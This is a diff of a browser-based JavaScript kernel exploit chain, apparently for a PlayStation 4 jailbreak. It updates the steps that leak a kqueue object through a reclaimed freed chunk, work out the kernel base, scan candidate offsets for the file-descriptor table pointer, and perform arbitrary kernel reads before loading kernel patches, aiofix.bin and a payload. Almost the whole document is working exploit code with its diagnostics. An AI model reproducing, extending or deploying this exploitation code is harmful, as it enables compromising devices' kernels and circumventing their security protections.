@@ -1,4 +1,4 @@
-// chain_poops_v7.js — retry de FDT-OFILES + debug de offset kq_fdp + sin cache
+// chain_poops_v8.js — aiofix.bin + retry con bailout + multi-offset fdt-ofiles
 import { establishPrimitive } from "./core.js?v=10";
 import { installWindowP, pairStatus } from "./mem.js";
 import { int64 } from "./int64.js";
@@ -28,9 +28,6 @@ const CFG_DO_KPATCH     = 1;
 const CFG_DO_PAYLOAD    = 1;
 // ============================================================
 
-// ============================================================
-// TELEMETRÍA
-// ============================================================
 const TM = window.__TM = window.__TM || {
     startedAt: Date.now(), errors: [], stages: {}, diagnostics: {}
 };
@@ -90,7 +87,7 @@ function check(name, ok, detail) {
     try {
         if (window.__TM) {
             window.__TM.diagnostics[name] = ok ? 'PASS' : 'FAIL';
-            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v7.js', line: 0, col: 0, stack: '' });
+            if (!ok) window.__TM.errors.push({ ts: Date.now() - window.__TM.startedAt, message: 'CHECK-FAIL: ' + name + '  ' + (detail || ''), file: 'chain_poops_v8.js', line: 0, col: 0, stack: '' });
             if (window.__TM.render) window.__TM.render();
         }
     } catch (e) { }
@@ -185,7 +182,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
 
         tmDiag('fw_key', key);
 
-        // ============ CARGAR aiofix Y payload ============
+        // ============ CARGAR aiofix (aiofix.bin) Y payload ============
         let kpatch = null, aiofix = null, payload = null;
         const kpatchName = off && off.kpatch ? "patches/" + off.kpatch
             : key ? "patches/" + key.replace(".", "") + ".bin" : null;
@@ -206,8 +203,9 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         }
         mark("KPATCH-BLOB", kpatch ? "bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "MISSING");
 
+        // *** FIX v8: fetch aiofix.bin (nombre correcto) ***
         try {
-            const r = await fetch("afix1.bin");
+            const r = await fetch("aiofix.bin?t=" + Date.now());
             if (r.ok) aiofix = new Uint8Array(await r.arrayBuffer());
         } catch (e) { mark("AIOFIX-FETCH-THREW", e.message); }
         mark("AIOFIX-BLOB", aiofix
@@ -215,7 +213,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             : "MISSING -- se usara solo GoldHEN");
 
         try {
-            const r = await fetch("payload.bin");
+            const r = await fetch("payload.bin?t=" + Date.now());
             if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
         } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
         mark("PAYLOAD-BLOB", payload ? "bytes=" + payload.length + " magic=" + (payload[0] === 0xe9 ? "e9-jmp" : (payload[0] === 0x7f ? "ELF" : "0x" + payload[0].toString(16))) : "MISSING");
@@ -841,6 +839,7 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
         // make_karw
         // ============================================================
         let kernelBase = null, kqFdp = null, kqFd = -1;
+        let kqLeakDump = null;   // *** v8: guardar copia del kqueue para leer offsets ***
         let kv = null;
         if (CFG_DO_MAKE_KARW === 1) {
             if (off.k_kl_lock === undefined || off.k_kl_lock === 0) {
@@ -861,7 +860,14 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                     const fdpLo = leakDv.getUint32(0x98, true);
                     const fdpHi = leakDv.getUint32(0x9c, true);
                     const magicOk = got >= 0xa0 && leakDv.getUint32(8, true) === KQ_HDR_MAGIC && leakDv.getUint32(12, true) === 0;
-                    if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) { kqFd = held.pop(); leaked = true; break; }
+                    if (magicOk && (fdpLo !== 0 || fdpHi !== 0)) {
+                        kqFd = held.pop();
+                        leaked = true;
+                        // *** v8: copiar el kqueue ANTES de cerrar el fd ***
+                        kqLeakDump = new Uint8Array(0xa0);
+                        for (let j = 0; j < 0xa0; ++j) kqLeakDump[j] = leakU8[j];
+                        break;
+                    }
                     if (magicOk) magicNoFdp++;
                     if (held.length >= KQ_BATCH) { while (held.length) sc(SYS.close, held.pop()); sc(SYS.sched_yield); }
                     if (i && i % 500 === 0) mark("KQUEUE-ROUND", "i=" + i + " magic_no_fdp=" + magicNoFdp + " short=" + shortRead);
@@ -869,30 +875,38 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
                 while (held.length) sc(SYS.close, held.pop());
                 check("kqueue-reclaimed-freed-chunk", leaked, "tries=" + tries + " magic_no_fdp=" + magicNoFdp + " short_reads=" + shortRead + (leaked ? " fd=" + kqFd : ""));
 
-                if (leaked) {
-                    const klLock = new int64(leakDv.getUint32(0x60, true), leakDv.getUint32(0x64, true));
-                    kqFdp = new int64(leakDv.getUint32(0x98, true), leakDv.getUint32(0x9c, true));
+                if (leaked && kqLeakDump) {
+                    // Leer offsets directamente del dump, no del leakDv (que puede cambiar)
+                    const rd32 = (o) => kqLeakDump[o] | (kqLeakDump[o+1] << 8) | (kqLeakDump[o+2] << 16) | (kqLeakDump[o+3] << 24);
+                    const rd64 = (o) => new int64(rd32(o) >>> 0, rd32(o+4) >>> 0);
+
+                    const klLock = rd64(0x60);
+                    kqFdp = rd64(0x98);
                     kernelBase = klLock.sub32(off.k_kl_lock);
                     mark("KQUEUE-LEAK", "kl_lock=" + klLock + " kq_fdp=" + kqFdp);
                     mark("KERNEL-BASE", kernelBase + " = kl_lock-0x" + off.k_kl_lock.toString(16));
 
-                    // *** DEBUG: imprimir candidatos de offset para kq_fdp ***
+                    // *** v8: probar todos los offsets candidatos para el kq_fdp ***
                     mark("KQUEUE-OFFSCAN", "probing offset candidates for kq_fdp");
+                    const candidates = [];
                     for (const probeOff of [0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8, 0xb0, 0xb8, 0xc0]) {
-                        const lo = leakDv.getUint32(probeOff, true);
-                        const hi = leakDv.getUint32(probeOff + 4, true);
-                        const candidate = new int64(lo, hi);
-                        const isK = (hi >>> 0) >= 0xffff0000 && (lo & 7) === 0;
-                        mark("KQ-OFF-0x" + probeOff.toString(16),
-                            candidate + (isK ? "  [PLAUSIBLE KPTR]" : ""));
+                        const cand = rd64(probeOff);
+                        const isK = (cand.hi >>> 0) >= 0xffff0000 && (cand.low & 7) === 0;
+                        mark("KQ-OFF-0x" + probeOff.toString(16), cand + (isK ? "  [PLAUSIBLE KPTR]" : ""));
+                        if (isK) candidates.push({ off: probeOff, ptr: cand });
                     }
+                    mark("KQUEUE-CANDIDATES", candidates.length + " plausible kptrs found");
 
                     check("kl_lock-kq_fdp-kernel-pointers", (klLock.hi >>> 0) === 0xffffffff && (kqFdp.hi >>> 0) >= 0xffff0000, "kl_lock.hi=" + hx(klLock.hi) + " kq_fdp.hi=" + hx(kqFdp.hi));
                     check("kernel-base-0x4000-aligned", (kernelBase.low & 0x3fff) === 0, "low=" + hx(kernelBase.low));
+
                     sc(SYS.close, kqFd);
                     triplets[2] = findTriplet(triplets[0], triplets[1], "KQ", MAX_ROUNDS_TRIPLET);
                     mark("POST-KQUEUE", "kq_fd=" + kqFd + " closed triplets=" + triplets.join(","));
                     check("triplets2-re-found-after-kqueue-leak", !!triplets[2], triplets.join(","));
+
+                    // Guardar los candidatos para el bloque de FDT-OFILES
+                    kqLeakDump.kqCandidates = candidates;
                 }
             }
         }
@@ -1088,19 +1102,41 @@ let _ipv6 = null, _iovSs = null, _uioSs = null, _masterPipe = null, _slavePipe =
             const R3_ON = params.get("r3") !== "0";
             const R4_ON = params.get("r4") !== "0";
 
-            // *** FIX v7: retry de kread8(kqFdp) con validación ***
+            // *** FIX v8: probar TODOS los candidatos de offset, con bailout después de 2 fallos ***
             let fdtOfiles = null;
-            for (let t = 0; t < 8 && !fdtOfiles; ++t) {
-                if (t) mark("FDT-OFILES-RETRY", "try=" + (t + 1));
+            let fdtUsedOff = -1;
+
+            if (kqLeakDump && kqLeakDump.kqCandidates && kqLeakDump.kqCandidates.length) {
+                mark("FDT-TRYING-CANDIDATES", kqLeakDump.kqCandidates.length + " candidates from kq offset scan");
+                let consecutiveFails = 0;
+                for (const cand of kqLeakDump.kqCandidates) {
+                    if (kreadPoisoned || !tripletsUsable()) break;
+                    if (consecutiveFails >= 2) {
+                        mark("FDT-BAILOUT", "2 consecutive fails, evito OOM");
+                        break;
+                    }
+                    mark("FDT-CANDIDATE", "off=0x" + cand.off.toString(16) + " ptr=" + cand.ptr);
+                    const v = await kread8(cand.ptr);
+                    if (v && kaddrOk(v)) {
+                        fdtOfiles = v;
+                        fdtUsedOff = cand.off;
+                        mark("FDT-FOUND", "off=0x" + cand.off.toString(16) + " -> " + v);
+                        break;
+                    } else {
+                        consecutiveFails++;
+                        mark("FDT-CANDIDATE-ZERO", "off=0x" + cand.off.toString(16) + " val=" + v + " fails=" + consecutiveFails);
+                    }
+                }
+            } else {
+                mark("FDT-NO-CANDIDATES", "fallback a kqFdp@0x98");
                 const v = await kread8(kqFdp);
                 if (v && kaddrOk(v)) {
                     fdtOfiles = v;
-                } else {
-                    mark("FDT-OFILES-ZERO", "try=" + (t + 1) + " val=" + v);
-                    await new Promise(r => setTimeout(r, 100));
+                    fdtUsedOff = 0x98;
                 }
             }
-            mark("FDT-OFILES", "" + (fdtOfiles || "FAILED-after-8-tries"));
+
+            mark("FDT-OFILES", "" + (fdtOfiles || "FAILED") + (fdtUsedOff >= 0 ? " via off 0x" + fdtUsedOff.toString(16) : ""));
 
             if (!fdtOfiles) {
                 mark("MAKE-KARW-ABORTED", "reason=fdt-ofiles-zero");
